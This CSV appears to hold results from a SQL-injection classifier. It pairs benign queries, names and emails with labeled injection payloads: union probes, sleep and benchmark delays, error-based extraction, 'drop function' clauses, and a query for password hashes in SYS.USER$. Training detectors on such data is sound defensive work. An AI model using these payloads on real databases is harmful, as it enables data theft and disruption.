payload,label,hardened_pred_label,hardened_pred_score
if  (  1928  =  4811  )   select 1928 else drop function ucko--,1,1,0.99999166
" SELECT * FROM telephone ORDER BY funny, sent",0,0,8.190775e-06
SELECT COUNT ( success )  FROM till,0,0,8.084317e-06
tracisto arroyave,0,0,7.916508e-06
SELECT * FROM nearby WHERE    NOT toward = 'letter',0,0,7.944612e-06
"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",1,1,0.99999154
"1'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'istb'  =  'istb",1,1,0.99999154
select   (  case when   (  5704  =  4125  )   then 5704 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1,0.99999166
"1%'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,0.99999154
38249138t,0,0,7.940423e-06
"peral, 180 4-b",0,0,8.223868e-06
SELECT Count ( * )  AS climate,0,0,7.987741e-06
1'   )    )    as mbzk where 9153  =  9153 and 2006  =  2006,1,1,0.99999166
"  SELECT MAKETIME ( 11, 35,   4 ) ;",0,0,7.97506e-06
"1%'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   '%'  =  '",1,1,0.99999154
lupien,0,0,7.96287e-06
SELECT * FROM greater FETCH FIRST 50 PERCENT ROWS ONLY,0,0,7.880811e-06
"  SELECT solveID AS ID, herself AS near FROM owner",0,0,8.180673e-06
SELECT AVG ( pocket ) FROM air SELECT SUM ( complete ) ,0,0,7.9653455e-06
SELECT COUNT ( pick ) FROM guard,0,0,8.123749e-06
"1%""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""%""  =  """,1,1,0.99999154
"1  )   where 2020  =  2020 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,0.99999154
9.4488E+15,0,0,7.907281e-06
1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,1,0.99999154
SELECT * FROM main ORDER BY nearby,0,0,8.140546e-06
1%' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and '%'  =  ',1,1,0.99999154
" SELECT * FROM cookies ORDER BY cut ASC, great DESC",0,0,8.085504e-06
"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",1,1,0.99999166
if  (  6767  =  5022  )   select 6767 else drop function buii--,1,1,0.99999166
SELECT * FROM split WHERE letter = 'fur'  OR applied = 'most',0,0,8.092872e-06
"1%'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,0.99999154
"  UPDATE which SET gas =  'court', City =  'its' WHERE dropped =  can",0,0,7.887096e-06
-6912' in boolean mode  )   union all select 6012--,1,1,0.99999166
san lorenzo de la parrilla,0,0,7.896384e-06
11640,0,0,8.028791e-06
SELECT * FROM inside WHERE NOT fall = 'book'  AND NOT fell = 'year',0,0,8.070498e-06
SELECT knowledge FROM fog UNION ALL SELECT column FROM bowl ORDER BY wing,0,0,8.070367e-06
"-8491"" where 6107  =  6107 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1,1,0.99999154
4644,0,0,7.984717e-06
" SELECT * FROM Customers  ORDER BY Country ASC, CustomerName DESC;",0,0,8.019288e-06
SELECT * FROM tired WHERE Price NOT BETWEEN 10 AND 20,0,0,7.998627e-06
-4684  )   as uqjn where 4550  =  4550 or 1689  =  5825,1,1,0.99999166
1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,1,1,0.99999154
"-8506'   )    )     )   union all select 1950,1950,1950,1950,1950,1950--",1,1,0.99999166
"c/ dau 100, 10-a",0,0,7.957259e-06
l16o2o,0,0,7.9280135e-06
" select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1,1,0.99999166
SELECT * FROM water WHERE dear = 'street'  OR bite = 'are',0,0,8.02338e-06
"1""  )   where 4822  =  4822 union all select null,null,null,null,null,null,null,null,null,null--",1,1,0.99999166
" SELECT * FROM charge ORDER BY free ASC, brush DESC",0,0,8.1298485e-06
j0ctar,0,0,7.960493e-06
-9721'  )   or 9287  =  4362#,1,1,0.99999166
select case when 3819  =  1887 then 1 else null end--,1,1,0.99999166
 UPDATE airplane SET question = 'first'WHERE basket = 'colony',0,0,7.894682e-06
-8163   )    )    as cvai where 2360  =  2360 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,1,0.99999154
select   (  case when   (  5085  =  4259  )   then 5085 else 5085*  (  select 5085 from mysql.db  )   end  )  #,1,1,0.99999154
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""%""  =  """,1,1,0.99999154
select * from users where id  =  '1' <@$_ or 1  =  1 -- 1',1,1,0.99999166
"  SELECT instrument,six,act FROM guard LEFT JOIN Orders ON audience.gravityID =  appropriate.mill ORDER BY congress.during",0,0,8.023977e-06
" SELECT column_name ( s )  FROM share,sound",0,0,7.987353e-06
"-2838"" where 5442  =  5442 union all select 5442#",1,1,0.99999166
"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'sxgl'  =  'sxgl",1,1,0.99999154
"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",1,1,0.99999166
49714,0,0,8.007587e-06
3nmo08v16a,0,0,7.907794e-06
SELECT TOP 3 * FROM sent SELECT * FROM evening 3SELECT * FROM cloud,0,0,8.011727e-06
"barranc de la torrentera, 56, 13?c",0,0,7.955295e-06
fredes damas,0,0,7.961875e-06
"  SELECT militaryID AS ID, evening AS protection FROM park",0,0,8.12409e-06
SELECT * FROM sense WHERE roll = 'western' FETCH FIRST 3 ROWS ONLY,0,0,7.894878e-06
mccarthy.darcy@tantomontamontatanto.jo,0,0,7.95874e-06
SELECT * FROM sea WHERE being = 'sugar' FETCH FIRST 3 ROWS ONLY,0,0,7.921742e-06
SELECT CURTIME (  )  + 1;,0,0,7.874492e-06
289,0,0,8.088158e-06
"1'||  (  select 'fzcu' where 9252  =  9252 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   ||'",1,1,0.99999154
"  UPDATE wash SET clothing =  'guess', City =  'monkey' WHERE nuts =  coming",0,0,7.919052e-06
"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,0.99999166
pagny@cpanelweb.yu,0,0,7.911248e-06
" SELECT column_name ( s )  FROM pot,spent",0,0,7.89146e-06
"-6870""  )   as deox where 8198  =  8198 union all select 8198#",1,1,0.99999166
1'   )    )    and 7533  =  7533 and    (    (   'pagc' like 'pagc,1,1,0.99999154
SELECT * FROM brief WHERE lesson NOT BETWEEN 'chose' AND 'sent',0,0,8.034359e-06
DELETE FROM check WHERE carry = 'yet',0,0,8.002609e-06
"1"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""xyjg""  =  ""xyjg",1,1,0.99999154
hallenbe,0,0,7.978103e-06
inciertamente,0,0,7.930131e-06
1 and 7533  =  7533,1,1,0.99999154
"1%' union all select null,null,null#",1,1,0.99999166
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""kngx"" like ""kngx",1,1,0.99999166
SELECT * FROM afraid FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM corner,0,0,7.875094e-06
"1'   )    )     )   union all select null,null,null--",1,1,0.99999166
" select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1,1,0.99999166
"1""  )   where 9962  =  9962 and 4595  =  4595#",1,1,0.99999166
SELECT MIN ( thick )  AS stomach FROM poor,0,0,8.158484e-06
SELECT * FROM nine WHERE split BETWEEN '1996-07-01' AND '1996-07-31',0,0,7.892183e-06
doroteya,0,0,8.002197e-06
"1'+  (  select sxco where 1623  =  1623 union all select null,null--",1,1,0.99999166
SELECT TOP 50 PERCENT * FROM distance SELECT * FROM effort FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM measure,0,0,7.850393e-06
"1%""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""%""  =  """,1,1,0.99999154
37759460s,0,0,7.91398e-06
"  (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,1,0.99999154
SELECT * FROM connected WHERE donkey NOT BETWEEN 'save' AND 'angle',0,0,7.9556885e-06
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- ygbf",1,1,0.99999166
SELECT * FROM distance  WHERE former NOT LIKE '[attempt]%',0,0,8.070136e-06
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'rtbm'  =  'rtbm",1,1,0.99999154
1   )    )    as tnhy where 1874  =  1874 and 2858  =  7324#,1,1,0.99999166
SELECT shall FROM better,0,0,8.341384e-06
1'  )   as wjty where 2971  =  2971,1,1,0.99999166
1   )    )    rlike   (  select   (  case when   (  6113  =  1222  )   then 1 else 0x28 end   )    )    and    (    (   2815  =  2815,1,1,0.99999154
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""nwjv""  =  ""nwjv",1,1,0.99999154
"1',  (  case when 5204  =  2136 then 1 else null end  )  ",1,1,0.99999154
llinars del valls,0,0,7.908382e-06
SELECT DISTINCT river FROM she,0,0,8.113436e-06
SELECT * FROM cow WHERE root = 'every' LIMIT 3,0,0,7.995042e-06
z5r1174osa,0,0,7.9086385e-06
1  )   where 4780  =  4780,1,1,0.99999166
ges,0,0,8.038114e-06
" union select * from users where login   =   char  (  114,111,111,116  )  ;",1,1,0.99999166
SELECT * FROM key WHERE suit = 'teach' LIMIT 3,0,0,7.97541e-06
SELECT * FROM adventure ORDER BY unhappy,0,0,8.1597445e-06
"1'   )    )    as namw where 1740  =  1740 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,1,0.99999154
"  SELECT workerID AS ID, mostly AS spin FROM room",0,0,8.146053e-06
SELECT TOP 3 * FROM replied WHERE fill = 'ordinary',0,0,7.978392e-06
"1'||  (  select 'lpej' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",1,1,0.99999154
1   )    )    as svhd where 9761  =  9761,1,1,0.99999166
SELECT * FROM fly WHERE nails = 'layers' FETCH FIRST 3 ROWS ONLY,0,0,7.891062e-06
1'   )    )     )   and 4595  =  4595#,1,1,0.99999166
3.71442E+15,0,0,7.915836e-06
SELECT TOP 3 * FROM begun WHERE future = 'way',0,0,8.127081e-06
1' where 9216  =  9216,1,1,0.99999166
"-7776'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ihof'  =  'ihof",1,1,0.99999154
1'  )   as sruz where 6318  =  6318,1,1,0.99999166
SELECT DISTINCT brush FROM huge,0,0,8.101405e-06
SELECT COUNT ( featureID ) FROM jar,0,0,8.083207e-06
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,1,0.99999166
SELECT * FROM minerals WHERE    NOT old = 'down',0,0,8.017475e-06
SELECT came ( s )  FROM seed SELECT tobacco FROM sick,0,0,8.075548e-06
SELECT AVG ( chemical ) FROM ants,0,0,8.09271e-06
naca39,0,0,7.97401e-06
gargajienta,0,0,7.941089e-06
"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  4003  =  4003",1,1,0.99999154
"1""   )    )    as spvl where 2242  =  2242 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1,1,0.99999154
8466,0,0,8.019387e-06
escultor damian forment 128 11?g,0,0,7.916901e-06
SELECT * FROM dangerous,0,0,8.205426e-06
SELECT * FROM symbol WHERE perfect = 'fellow' LIMIT 3,0,0,7.99415e-06
cutler.hutton@the-white-pearl-resort.int,0,0,8.1659955e-06
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'nhuk'  =  'nhuk",1,1,0.99999154
"1%' and make_set  (  8403  =  8403,8899  )   and '%'  =  '",1,1,0.99999166
SELECT * FROM wp_posts WHERE ID  =  28638 LIMIT 1,0,0,7.947499e-06
SELECT * FROM farther WHERE NOT determine = 'began'  AND NOT sink = 'fully',0,0,8.085905e-06
curul,0,0,7.981116e-06
SELECT MIN ( grown )  AS weak FROM battle,0,0,8.164618e-06
"1""   )    )    as ajwe where 1153  =  1153 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1,1,0.99999154
SELECT AVG ( fifteen ) FROM sister SELECT SUM ( lack ) ,0,0,8.0124755e-06
"   SELECT Employees.number, COUNT ( Orders.dailyID )  AS incomeFROM    ( OrdersINNER JOIN purple ON Orders.dependID  =  Employees.passageID ) ",0,0,7.884314e-06
"1%""   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,0.99999154
"1%"" union all select null,null,null--",1,1,0.99999166
"1' where 8451  =  8451 union all select null,null,null,null,null,null,null,null,null#",1,1,0.99999166
qunola,0,0,7.961685e-06
1' where 7725  =  7725 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,0.99999154
SELECT * FROM brass WHERE straight = 'chemical'  AND City = 'recall',0,0,8.082652e-06
SELECT * FROM surrounded ORDER BY ear,0,0,8.127314e-06
1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wevl'  =  'wevl,1,1,0.99999154
" SELECT column_name ( s )  FROM saw,powder",0,0,7.917868e-06
"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",1,1,0.99999166
schucrenberg-oheaney3@testdevelcidad.info,0,0,7.98608e-06
50212,0,0,8.0305745e-06
1'  )   where 6045  =  6045,1,1,0.99999166
"pl. limeo 22, 5?e",0,0,7.912214e-06
-5336'  )   where 8691  =  8691 or 3608  =  1887--,1,1,0.99999166
2639,0,0,7.996667e-06
"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",1,1,0.99999166
coria,0,0,8.050911e-06
1'+  (  select 'supo' where 8691  =  8691,1,1,0.99999166
SELECT * FROM physical WHERE hearing = 'shirt'  OR opinion = 'breath',0,0,8.055042e-06
62145911a,0,0,7.921212e-06
"-3411'   )    )     )   union all select 3185,3185,3185,3185,3185,3185,3185,3185--",1,1,0.99999166
"-9160'  )   union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",1,1,0.99999154
SELECT * FROM central WHERE lesson LIKE '%am%',0,0,8.013829e-06
SELECT * FROM hung WHERE fire = 'studied' LIMIT 3,0,0,8.089377e-06
"call regexp_substring  (  repeat  (  right  (  char  (  2385  )  ,0  )  ,500000000  )  ,null  )  --",1,1,0.99999154
SELECT * FROM win ORDER BY advice,0,0,8.144693e-06
"-7868"" union all select 1805--",1,1,0.99999166
villalpando iturbide,0,0,7.902946e-06
SELECT TOP 3 * FROM rise SELECT * FROM substance 3SELECT * FROM cutting,0,0,7.985624e-06
"-7008'   )    )    union all select 9080,9080,9080#",1,1,0.99999166
SELECT TOP 3 * FROM equipment,0,0,8.059468e-06
" SELECT column_name ( s )  FROM outside,inch",0,0,7.8785715e-06
obscurantismo,0,0,7.927454e-06
bowen-gugolka@soyriojano.name,0,0,7.950144e-06
1.93115E+15,0,0,7.935048e-06
dennis,0,0,8.023365e-06
irissou,0,0,7.975949e-06
SELECT * FROM wool WHERE protection  BETWEEN 10 AND 20,0,0,8.115494e-06
1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',1,1,0.99999166
SELECT FLOOR ( RAND (  ) * ( 10-5+1 ) +5 ) ;,0,0,8.712696e-06
tronchuda,0,0,7.947272e-06
5296,0,0,8.005449e-06
1   )    )    as eigk where 2557  =  2557,1,1,0.99999166
"cantallops, 138,",0,0,7.932657e-06
1.00217E+15,0,0,7.920352e-06
cuellar reino,0,0,7.931939e-06
51780892a,0,0,7.926442e-06
SELECT * FROM chance WHERE similar = 'pile',0,0,8.193689e-06
SELECT * FROM second WHERE star = 'island'  OR river = 'beside',0,0,7.977676e-06
SELECT * FROM common WHERE equipment = 'sleep' FETCH FIRST 3 ROWS ONLY,0,0,7.95198e-06
SELECT * FROM tea  WHERE gulf NOT LIKE '[explanation]%',0,0,7.985883e-06
select   (  case when   (  3537  =  5218  )   then 3537 else 3537*  (  select 3537 from mysql.db  )   end  )  #,1,1,0.99999154
" select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",1,1,0.99999166
"cami son anglada, s/n",0,0,7.906692e-06
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3781 )  ORDER BY meta_id ASC",0,0,7.842693e-06
"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'ijyi'  =  'ijyi",1,1,0.99999154
"1'  )   where 2284  =  2284 and make_set  (  8403  =  8403,8899  )  --",1,1,0.99999166
yong-gomori@andrestabernero.gg,0,0,7.92849e-06
select * from users where id  =  1 +$+ or 1  =  1 -- 1,1,1,0.99999166
43823011f,0,0,7.941983e-06
1' rlike sleep  (  5  ) ,1,1,0.99999166
cella,0,0,8.030039e-06
1'  )   as chla where 6098  =  6098,1,1,0.99999166
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c88946771c' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,0,8.239018e-06
1%'  )   and 4595  =  4595#,1,1,0.99999166
"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1,0.99999154
corazones 168,0,0,7.9517295e-06
grifeo@lalectura.af,0,0,7.903104e-06
52207398c,0,0,7.937576e-06
" SELECT City, Country FROM Customers WHERE Country = 'Germany' UNION ",0,0,8.104744e-06
"1'||  (  select 'ysij' from dual where 6140  =  6140 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",1,1,0.99999154
"-5360' where 8178  =  8178 union all select 8178,8178,8178--",1,1,0.99999166
